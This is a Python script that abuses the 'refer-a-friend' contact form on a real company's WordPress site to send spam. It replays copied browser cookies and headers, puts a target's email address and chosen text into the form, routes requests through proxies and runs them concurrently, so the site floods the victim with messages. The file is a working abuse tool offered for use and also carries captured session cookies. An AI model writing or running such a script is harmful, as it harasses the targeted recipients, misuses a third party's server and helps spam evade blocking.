from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        cookies = {
            '_gcl_au': '1.1.832115564.1678104417',
            'cookielawinfo-checkbox-necessary': 'yes',
            'cookielawinfo-checkbox-functional': 'yes',
            'cookielawinfo-checkbox-performance': 'yes',
            'cookielawinfo-checkbox-analytics': 'yes',
            'cookielawinfo-checkbox-advertisement': 'yes',
            'cookielawinfo-checkbox-others': 'yes',
            '_gid': 'GA1.3.1705575558.1678104418',
            '_hjFirstSeen': '1',
            '_hjIncludedInSessionSample_3178594': '1',
            '_hjSession_3178594': 'eyJpZCI6IjJhNmJiMWJlLWYxNjAtNDRhZi1iMjU3LThmNDc5YWJiZTI2YyIsImNyZWF0ZWQiOjE2NzgxMDQ0MTg3NjIsImluU2FtcGxlIjp0cnVlfQ==',
            '_hjIncludedInPageviewSample': '1',
            '_hjAbsoluteSessionInProgress': '1',
            '_fbp': 'fb.2.1678104418909.1553121595',
            'PHPSESSID': '9ffe09f8e12313054444f46a514dedc4',
            'ywsl_wp_session': 'd96aa331bd873ad23b25067b03785af7%7C%7C1678147624%7C%7C1678145824',
            'pum-29849': 'true',
            '_ga_Z9TENW5HG3': 'GS1.1.1678104417.1.1.1678104478.0.0.0',
            '_ga': 'GA1.3.1525415509.1678104418',
            '_hjSessionUser_3178594': 'eyJpZCI6ImVmYTAwNzMxLTMyYzctNTA4Zi04OTFlLTEyMjNlMDgyYzM2ZSIsImNyZWF0ZWQiOjE2NzgxMDQ0MTg3NTQsImV4aXN0aW5nIjp0cnVlfQ==',
            '_ga_NPBKT8SRNQ': 'GS1.1.1678104417.1.1.1678104524.14.0.0',
        }

        headers = {
            'authority': 'myoceans.co.uk',
            'accept': 'application/json, */*;q=0.1',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryMAxtP7pT9pfASqdh',
            'origin': 'https://myoceans.co.uk',
            'pragma': 'no-cache',
            'referer': 'https://myoceans.co.uk/refer-a-friend/',
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        }

        data = '------WebKitFormBoundaryMAxtP7pT9pfASqdh\r\nContent-Disposition: form-data; name="_wpcf7"\r\n\r\n431\r\n------WebKitFormBoundaryMAxtP7pT9pfASqdh\r\nContent-Disposition: form-data; name="_wpcf7_version"\r\n\r\n5.6.4\r\n------WebKitFormBoundaryMAxtP7pT9pfASqdh\r\nContent-Disposition: form-data; name="_wpcf7_locale"\r\n\r\nen_GB\r\n------WebKitFormBoundaryMAxtP7pT9pfASqdh\r\nContent-Disposition: form-data; name="_wpcf7_unit_tag"\r\n\r\nwpcf7-f431-o1\r\n------WebKitFormBoundaryMAxtP7pT9pfASqdh\r\nContent-Disposition: form-data; name="_wpcf7_container_post"\r\n\r\n0\r\n------WebKitFormBoundaryMAxtP7pT9pfASqdh\r\nContent-Disposition: form-data; name="_wpcf7_posted_data_hash"\r\n\r\ncf1e8a5db8ae50f17f4e56d37045ce2f\r\n------WebKitFormBoundaryMAxtP7pT9pfASqdh\r\nContent-Disposition: form-data; name="name"\r\n\r\ntest\r\n------WebKitFormBoundaryMAxtP7pT9pfASqdh\r\nContent-Disposition: form-data; name="email"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryMAxtP7pT9pfASqdh\r\nContent-Disposition: form-data; name="friends_name"\r\n\r\ntest\r\n------WebKitFormBoundaryMAxtP7pT9pfASqdh\r\nContent-Disposition: form-data; name="friends_email"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryMAxtP7pT9pfASqdh--\r\n'
        data = data.replace('wezxasqw@gmail.com', target)
        data = data.replace('test', self.get_text()).encode()

        response = requests.post(
            'https://myoceans.co.uk/wp-json/contact-form-7/v1/contact-forms/431/feedback',
            cookies=cookies,
            headers=headers,
            data=data,
            proxies=self.get_proxies(), timeout=20
        )
        return response


def main():
    s = 'Thank you for inviting your friend!'

    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
